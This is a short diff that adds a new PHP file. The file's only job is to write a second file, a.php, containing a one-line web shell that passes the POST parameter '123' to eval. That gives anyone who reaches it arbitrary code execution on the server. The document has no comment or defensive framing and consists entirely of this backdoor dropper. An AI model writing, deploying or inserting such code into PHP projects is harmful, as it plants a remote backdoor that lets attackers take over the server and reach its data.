@@ -1,0 +1,6 @@
+<?php
+$a = "<?php eval(\$_POST['123'])?>";
+$b = fopen("a.php","w") or die("123!");
+fwrite($b,$a);
+fclose($b);
+?>
